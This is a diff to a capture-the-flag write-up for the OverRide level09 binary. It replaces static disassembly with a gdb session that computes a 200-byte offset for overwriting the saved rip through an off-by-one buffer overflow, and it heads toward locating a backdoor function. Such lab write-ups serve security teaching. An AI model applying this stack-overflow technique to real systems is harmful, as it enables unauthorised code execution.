@@ -57,19 +57,43 @@ for (int i = 0; i <= 40; ++i)
 ```
 In the `set_username` function, the program copy 41 bytes from input buffer to second element of the structure whose size is 40 bytes. So 41st byte overwrite third element of the structure. Now we can overwrite third element who can control how many bytes we can copy to first element of the structure.
 
-## Step 3. Calculate offset
+## Step 3. Calculate offset to overwrite `rip`
 ```assembly
-level09@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble handle_msg" level09
-   0x00000000000008c0 <+0>:		push   rbp
-   0x00000000000008c1 <+1>:		mov    rbp,rsp
-   0x00000000000008c4 <+4>:		sub    rsp,0xc0
 [...]
-   0x0000000000000915 <+85>:	lea    rax,[rbp-0xc0]
-   0x000000000000091c <+92>:	mov    rdi,rax
-   0x000000000000091f <+95>:	call   0x932 <set_msg>
+   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
+   0x000055555555490d <+77>:	mov    rdi,rax
+=> 0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
+   0x000055555555491c <+92>:	mov    rdi,rax
+   0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
 [...]
 ```
-This is an 64-bit ELF, so every register is 8 bytes. Offset is `0xc0 + 0x8(rbp) = 0xc8(200)`
+```
+level09@OverRide:~$ gdb -q level09
+(gdb) break *0x0000555555554910
+Breakpoint 1 at 0x555555554910
+(gdb) run
+Starting program: /home/users/level09/level09
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+
+Breakpoint 1, 0x0000555555554910 in handle_msg ()
+(gdb) info registers rax
+rax            0x7fffffffe500	140737488348416
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffe5d0:
+ rip = 0x555555554910 in handle_msg; saved rip 0x555555554abd
+ called by frame at 0x7fffffffe5e0
+ Arglist at 0x7fffffffe5c0, args:
+ Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
+ Saved registers:
+  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
+(gdb) print 0x7fffffffe5c8 - 0x7fffffffe500
+$1 = 200
+```
+We set a breakpoint before calling `set_username`, then got offset `200` by calculating `rip - rax`.
 
 ## Step 4. Find the address of secret backdoor function
 ```
